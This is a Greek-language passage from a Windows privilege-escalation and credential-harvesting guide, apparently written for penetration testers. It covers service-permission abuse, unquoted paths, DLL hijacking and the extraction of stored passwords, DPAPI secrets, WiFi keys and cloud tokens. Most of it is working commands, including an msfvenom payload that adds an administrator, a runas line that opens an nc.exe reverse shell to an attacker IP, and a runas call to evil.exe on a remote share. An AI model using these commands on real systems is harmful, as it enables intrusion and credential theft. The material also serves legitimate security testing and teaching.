* **WRITE\_OWNER**: Επιτρέπει την απόκτηση ιδιοκτησίας και την αναδιάρθρωση δικαιωμάτων.
* **GENERIC\_WRITE**: Κληρονομεί τη δυνατότητα αλλαγής των ρυθμίσεων της υπηρεσίας.
* **GENERIC\_ALL**: Επίσης κληρονομεί τη δυνατότητα αλλαγής των ρυθμίσεων της υπηρεσίας.

Για τον εντοπισμό και την εκμετάλλευση αυτής της ευπάθειας, μπορεί να χρησιμοποιηθεί το _exploit/windows/local/service\_permissions_.

### Αδύναμα δικαιώματα δυαδικών υπηρεσιών

**Ελέγξτε αν μπορείτε να τροποποιήσετε το δυαδικό που εκτελείται από μια υπηρεσία** ή αν έχετε **δικαιώματα εγγραφής στον φάκελο** όπου βρίσκεται το δυαδικό ([**DLL Hijacking**](dll-hijacking.md))**.**\
Μπορείτε να λάβετε κάθε δυαδικό που εκτελείται από μια υπηρεσία χρησιμοποιώντας το **wmic** (όχι στο system32) και να ελέγξετε τα δικαιώματά σας χρησιμοποιώντας το **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Μπορείτε επίσης να χρησιμοποιήσετε τα **sc** και **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Δικαιώματα τροποποίησης καταχωρήσεων υπηρεσιών

Πρέπει να ελέγξετε εάν μπορείτε να τροποποιήσετε οποιαδήποτε καταχώρηση υπηρεσίας.\
Μπορείτε **να ελέγξετε** τα **δικαιώματά** σας σε μια καταχώρηση υπηρεσίας κάνοντας:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Πρέπει να ελεγχθεί εάν οι **Εξουσιοδοτημένοι Χρήστες** ή **NT AUTHORITY\INTERACTIVE** έχουν δικαιώματα `FullControl`. Αν ναι, το δυαδικό που εκτελείται από την υπηρεσία μπορεί να τροποποιηθεί.

Για να αλλάξετε τη διαδρομή του δυαδικού που εκτελείται:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Δικαιώματα προσθήκης δεδομένων/προσθήκης υποκαταλόγου στο μητρώο υπηρεσιών

Αν έχετε αυτήν την άδεια πάνω σε ένα μητρώο, αυτό σημαίνει ότι **μπορείτε να δημιουργήσετε υπομητρώα από αυτό**. Στην περίπτωση των υπηρεσιών των Windows αυτό είναι **αρκετό για να εκτελέσετε αυθαίρετο κώδικα:**

{% content-ref url="appenddata-addsubdirectory-permission-over-service-registry.md" %}
[appenddata-addsubdirectory-permission-over-service-registry.md](appenddata-addsubdirectory-permission-over-service-registry.md)
{% endcontent-ref %}

### Μη-περικλειόμενοι Διαδρομές Υπηρεσιών

Εάν η διαδρομή προς ένα εκτελέσιμο δεν βρίσκεται μέσα σε εισαγωγικά, τα Windows θα προσπαθήσουν να εκτελέσουν κάθε τελείωμα πριν από ένα κενό.

Για παράδειγμα, για τη διαδρομή _C:\Program Files\Some Folder\Service.exe_ τα Windows θα προσπαθήσουν να εκτελέσουν:
```powershell
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
### Κατάλογος όλων των μη-περικυκλωμένων διαδρομών υπηρεσιών, εξαιρώντας αυτές που ανήκουν σε ενσωματωμένες υπηρεσίες των Windows:
```bash
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """ #Not only auto services

#Other way
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Μπορείτε να ανιχνεύσετε και να εκμεταλλευτείτε** αυτή την ευπάθεια με το metasploit: `exploit/windows/local/trusted\_service\_path` Μπορείτε να δημιουργήσετε χειροκίνητα ένα δυαδικό αρχείο υπηρεσίας με το metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Ενέργειες Ανάκτησης

Τα Windows επιτρέπουν στους χρήστες να καθορίσουν ενέργειες που θα πρέπει να ακολουθηθούν σε περίπτωση αποτυχίας ενός υπηρεσίας. Αυτό το χαρακτηριστικό μπορεί να ρυθμιστεί ώστε να δείχνει σε ένα δυαδικό αρχείο. Εάν αυτό το δυαδικό αρχείο είναι αντικαταστάσιμο, τότε ενδέχεται να υπάρχει δυνατότητα ανόδου προνομίων. Περισσότερες λεπτομέρειες μπορούν να βρεθούν στην [επίσημη τεκμηρίωση](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662\(v=ws.11\)?redirectedfrom=MSDN).

## Εφαρμογές

### Εγκατεστημένες Εφαρμογές

Ελέγξτε τις **άδειες των δυαδικών αρχείων** (ίσως μπορείτε να αντικαταστήσετε ένα και να αναβαθμίσετε τα προνόμια) και των **φακέλων** ([Διαρροή DLL](dll-hijacking.md)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Δικαιώματα Εγγραφής

Ελέγξτε αν μπορείτε να τροποποιήσετε κάποιο αρχείο ρύθμισης για να διαβάσετε κάποιο ειδικό αρχείο ή αν μπορείτε να τροποποιήσετε κάποιο δυαδικό που θα εκτελεστεί από ένα λογαριασμό Διαχειριστή (schedtasks).

Ένας τρόπος να βρείτε αδύναμες άδειες φακέλων/αρχείων στο σύστημα είναι:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Εκτέλεση κατά την εκκίνηση

**Ελέγξτε εάν μπορείτε να αντικαταστήσετε κάποιο κλειδί μητρώου ή δυαδικό που θα εκτελεστεί από διαφορετικό χρήστη.**\
**Διαβάστε** την **παρακάτω σελίδα** για να μάθετε περισσότερα για ενδιαφέρουσες **τοποθεσίες εκκίνησης για την ανύψωση δικαιωμάτων**:

{% content-ref url="privilege-escalation-with-autorun-binaries.md" %}
[privilege-escalation-with-autorun-binaries.md](privilege-escalation-with-autorun-binaries.md)
{% endcontent-ref %}

### Οδηγοί

Αναζητήστε πιθανούς **τρίτους παράξενους/ευάλωτους** οδηγούς
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
## ΕΚΜΕΤΑΛΛΕΥΣΗ DLL Hijacking

Εάν έχετε **δικαιώματα εγγραφής μέσα σε έναν φάκελο που υπάρχει στο PATH**, μπορείτε να καταφέρετε να εκμεταλλευτείτε ένα DLL που φορτώνεται από ένα διεργασία και να **αναβαθμίσετε τα δικαιώματά σας**.

Ελέγξτε τα δικαιώματα όλων των φακέλων μέσα στο PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Για περισσότερες πληροφορίες σχετικά με το πώς να εκμεταλλευτείτε αυτόν τον έλεγχο:

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

## Δίκτυο

### Κοινοποιήσεις
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### αρχείο hosts

Ελέγξτε για άλλους γνωστούς υπολογιστές που έχουν καταχωρηθεί στατικά στο αρχείο hosts
```
type C:\Windows\System32\drivers\etc\hosts
```
### Δικτυακές Διεπαφές & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Ανοιχτές Θύρες

Ελέγξτε για **περιορισμένες υπηρεσίες** από το εξωτερικό
```bash
netstat -ano #Opened ports?
```
### Πίνακας Δρομολόγησης
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Πίνακας ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Κανόνες του τοίχου προστασίας

[**Ελέγξτε αυτήν τη σελίδα για σχετικές εντολές τοίχου προστασίας**](../basic-cmd-for-pentesters.md#firewall) **(κατάλογος κανόνων, δημιουργία κανόνων, απενεργοποίηση, απενεργοποίηση...)**

Περισσότερες [εντολές για απαρίθμηση δικτύου εδώ](../basic-cmd-for-pentesters.md#network)

### Υποσύστημα Windows για Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Το δυαδικό `bash.exe` μπορεί επίσης να βρεθεί στο `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Αν αποκτήσετε ριζικό χρήστη μπορείτε να ακούτε σε οποιαδήποτε θύρα (την πρώτη φορά που χρησιμοποιείτε το `nc.exe` για να ακούσετε σε μια θύρα, θα ζητηθεί μέσω GUI αν το `nc` πρέπει να επιτραπεί από το τείχος προστασίας).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Για να ξεκινήσετε εύκολα το bash ως ριζικό χρήστη, μπορείτε να δοκιμάσετε `--default-user root`

Μπορείτε να εξερευνήσετε το σύστημα αρχείων του `WSL` στον φάκελο `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Διαπιστεύσεις Windows

### Διαπιστεύσεις Winlogon
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Διαχειριστής διαπιστεύσεων / Θησαυρός των Windows

Από [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Ο Θησαυρός των Windows αποθηκεύει τις διαπιστεύσεις χρήστη για διακομιστές, ιστότοπους και άλλα προγράμματα που τα **Windows** μπορούν να συνδεθούν αυτόματα. Αρχικά, αυτό μπορεί να φαίνεται ότι οι χρήστες μπορούν να αποθηκεύσουν τις διαπιστεύσεις τους για το Facebook, το Twitter, το Gmail κλπ., ώστε να συνδέονται αυτόματα μέσω περιηγητών. Αλλά δεν είναι έτσι.

Ο Θησαυρός των Windows αποθηκεύει διαπιστεύσεις που τα Windows μπορούν να συνδεθούν αυτόματα, πράγμα που σημαίνει ότι οποιαδήποτε **εφαρμογή των Windows που χρειάζεται διαπιστεύσεις για πρόσβαση σε ένα πόρο** (διακομιστή ή ιστότοπο) **μπορεί να χρησιμοποιήσει αυτόν τον Διαχειριστή Διαπιστεύσεων & τον Θησαυρό των Windows και να χρησιμοποιήσει τις παρεχόμενες διαπιστεύσεις αντί να εισάγουν οι χρήστες το όνομα χρήστη και τον κωδικό πρόσβασης συνεχώς.

Εκτός αν οι εφαρμογές αλληλεπιδρούν με τον Διαχειριστή Διαπιστεύσεων, δεν νομίζω ότι είναι δυνατόν να χρησιμοποιήσουν τις διαπιστεύσεις για έναν συγκεκριμένο πόρο. Έτσι, αν η εφαρμογή σας θέλει να χρησιμοποιήσει τον θησαυρό, θα πρέπει κάπως **να επικοινωνήσει με τον διαχειριστή διαπιστεύσεων και να ζητήσει τις διαπιστεύσεις για αυτόν τον πόρο** από τον προεπιλεγμένο θησαυρό αποθήκευσης.

Χρησιμοποιήστε το `cmdkey` για να εμφανίσετε τις αποθηκευμένες διαπιστεύσεις στη μηχανή.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Στη συνέχεια μπορείτε να χρησιμοποιήσετε το `runas` με τις επιλογές `/savecred` για να χρησιμοποιήσετε τα αποθηκευμένα διαπιστευτήρια. Το παρακάτω παράδειγμα καλεί ένα απομακρυσμένο δυαδικό μέσω ενός κοινόχρηστου φακέλου SMB.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Χρησιμοποιώντας το `runas` με ένα συγκεκριμένο σύνολο διαπιστευτήριων.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Σημειώστε ότι το mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials\_file\_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault\_password\_view.html), ή από το [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/credentials/dumpCredStore.ps1).

### DPAPI

Το **Data Protection API (DPAPI)** παρέχει έναν τρόπο για τη συμμετρική κρυπτογράφηση δεδομένων, κυρίως χρησιμοποιούμενο εντός του λειτουργικού συστήματος Windows για τη συμμετρική κρυπτογράφηση ασύμμετρων ιδιωτικών κλειδιών. Αυτή η κρυπτογράφηση εκμεταλλεύεται ένα μυστικό χρήστη ή συστήματος για να συμβάλει σημαντικά στην εντροπία.

**Το DPAPI επιτρέπει την κρυπτογράφηση κλειδιών μέσω ενός συμμετρικού κλειδιού που προέρχεται από τα μυστικά στοιχεία σύνδεσης του χρήστη**. Σε περιπτώσεις που αφορούν την κρυπτογράφηση συστήματος, χρησιμοποιεί τα μυστικά ελέγχου ταυτότητας του τομέα του συστήματος.

Τα κρυπτογραφημένα RSA κλειδιά χρήστη, χρησιμοποιώντας το DPAPI, αποθηκεύονται στον κατάλογο `%APPDATA%\Microsoft\Protect\{SID}`, όπου `{SID}` αντιπροσωπεύει το [Αναγνωριστικό Ασφαλείας](https://en.wikipedia.org/wiki/Security\_Identifier) του χρήστη. **Το κλειδί DPAPI, συνυπάρχει με τον κύριο κλειδί που προστατεύει τα ιδιωτικά κλειδιά του χρήστη στον ίδιο φάκελο**, συνήθως αποτελείται από 64 bytes τυχαίων δεδομένων. (Είναι σημαντικό να σημειωθεί ότι η πρόσβαση σε αυτόν τον κατάλογο είναι περιορισμένη, αποτρέποντας την εμφάνιση των περιεχομένων του μέσω της εντολής `dir` στο CMD, αν και μπορεί να εμφανιστεί μέσω PowerShell).
```powershell
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Μπορείτε να χρησιμοποιήσετε το **mimikatz module** `dpapi::masterkey` με τα κατάλληλα ορίσματα (`/pvk` ή `/rpc`) για να το αποκρυπτογραφήσετε.

Τα **αρχεία διαπιστευτήρων που προστατεύονται από τον κύριο κωδικό πρόσβασης** συνήθως βρίσκονται στο:
```powershell
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Μπορείτε να χρησιμοποιήσετε το **mimikatz module** `dpapi::cred` με το κατάλληλο `/masterkey` για να αποκρυπτογραφήσετε.\
Μπορείτε να **εξάγετε πολλά DPAPI** **masterkeys** από τη **μνήμη** με το module `sekurlsa::dpapi` (αν είστε root).

{% content-ref url="dpapi-extracting-passwords.md" %}
[dpapi-extracting-passwords.md](dpapi-extracting-passwords.md)
{% endcontent-ref %}

### Διαπιστευτήρια PowerShell

Τα **PowerShell credentials** χρησιμοποιούνται συχνά για **scripting** και εργασίες αυτοματισμού ως ένας τρόπος αποθήκευσης κρυπτογραφημένων διαπιστευτηρίων με βολικό τρόπο. Τα διαπιστευτήρια προστατεύονται χρησιμοποιώντας **DPAPI**, το οποίο συνήθως σημαίνει ότι μπορούν να αποκρυπτογραφηθούν μόνο από τον ίδιο χρήστη στον ίδιο υπολογιστή όπου δημιουργήθηκαν.

Για να **αποκρυπτογραφήσετε** ένα PS credentials από το αρχείο που το περιέχει, μπορείτε να κάνετε:
```powershell
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi

### Ασύρματο Δίκτυο
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Αποθηκευμένες Συνδέσεις RDP

Μπορείτε να τις βρείτε στο `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
και στο `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Πρόσφατες Εκτελεσμένες Εντολές
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Διαχειριστής Διαπιστεύσεων Απομακρυσμένης Επιφάνειας Εργασίας**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Χρησιμοποιήστε το **Mimikatz** `dpapi::rdg` module με το κατάλληλο `/masterkey` για να **αποκρυπτογραφήσετε οποιαδήποτε αρχεία .rdg**\
Μπορείτε να **εξάγετε πολλά DPAPI masterkeys** από τη μνήμη με το Mimikatz `sekurlsa::dpapi` module

### Σημειώσεις Sticky

Οι άνθρωποι χρησιμοποιούν συχνά την εφαρμογή StickyNotes στα Windows workstations για να **αποθηκεύουν κωδικούς πρόσβασης** και άλλες πληροφορίες, χωρίς να συνειδητοποιούν ότι πρόκειται για ένα αρχείο βάσης δεδομένων. Αυτό το αρχείο βρίσκεται στη διαδρομή `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` και αξίζει πάντα να αναζητείτε και να το εξετάζετε.

### AppCmd.exe

**Σημειώστε ότι για να ανακτήσετε κωδικούς πρόσβασης από το AppCmd.exe πρέπει να είστε Διαχειριστής και να τρέχετε υπό υψηλό επίπεδο Integrity.**\
Το **AppCmd.exe** βρίσκεται στον κατάλογο `%systemroot%\system32\inetsrv\`.\
Αν αυτό το αρχείο υπάρχει, τότε είναι πιθανό ότι έχουν διαμορφωθεί κάποια **διαπιστευτήρια** και μπορούν να **ανακτηθούν**.

Αυτός ο κώδικας εξήχθη από το [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Ελέγξτε εάν υπάρχει το `C:\Windows\CCM\SCClient.exe`.\
Οι εγκαταστάτες εκτελούνται με **δικαιώματα SYSTEM**, πολλοί είναι ευάλωτοι στο **DLL Sideloading (Πληροφορίες από** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Αρχεία και Καταχωρήσεις (Διαπιστευτήρια)

### Διαπιστευτήρια Putty
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Κλειδιά Κεντρικού Οικοδεσπότη SSH του Putty
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### Κλειδιά SSH στο μητρώο

Τα ιδιωτικά κλειδιά SSH μπορούν να αποθηκευτούν μέσα στο κλειδί μητρώου `HKCU\Software\OpenSSH\Agent\Keys`, οπότε θα πρέπει να ελέγξετε αν υπάρχει κάτι ενδιαφέρον εκεί:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Εάν βρείτε οποιαδήποτε καταχώριση μέσα σε αυτή τη διαδρομή, πιθανότατα θα είναι ένα κρυπτογραφημένο κλειδί SSH. Αποθηκεύεται κρυπτογραφημένο αλλά μπορεί να αποκρυπτογραφηθεί εύκολα χρησιμοποιώντας [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Περισσότερες πληροφορίες σχετικά με αυτήν την τεχνική εδώ: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Εάν η υπηρεσία `ssh-agent` δεν εκτελείται και θέλετε να ξεκινά αυτόματα κατά την εκκίνηση, εκτελέστε:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
{% hint style="info" %}
Φαίνεται ότι αυτή η τεχνική δεν είναι πλέον έγκυρη. Δοκίμασα να δημιουργήσω μερικά κλειδιά ssh, να τα προσθέσω με την εντολή `ssh-add` και να συνδεθώ μέσω ssh σε μια μηχανή. Το κλειδί HKCU\Software\OpenSSH\Agent\Keys δεν υπάρχει και το procmon δεν ανέγνωρισε τη χρήση του `dpapi.dll` κατά την αυθεντικοποίηση με ασύμμετρο κλειδί.
{% endhint %}

### Ανεπίτρεπτα αρχεία
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Μπορείτε επίσης να αναζητήσετε αυτά τα αρχεία χρησιμοποιώντας το **metasploit**: _post/windows/gather/enum\_unattend_

Παράδειγμα περιεχομένου:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Αντίγραφα ασφαλείας SAM & SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cloud Διαπιστευτήρια
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Αναζητήστε ένα αρχείο που ονομάζεται **SiteList.xml**

### Cached GPP Password

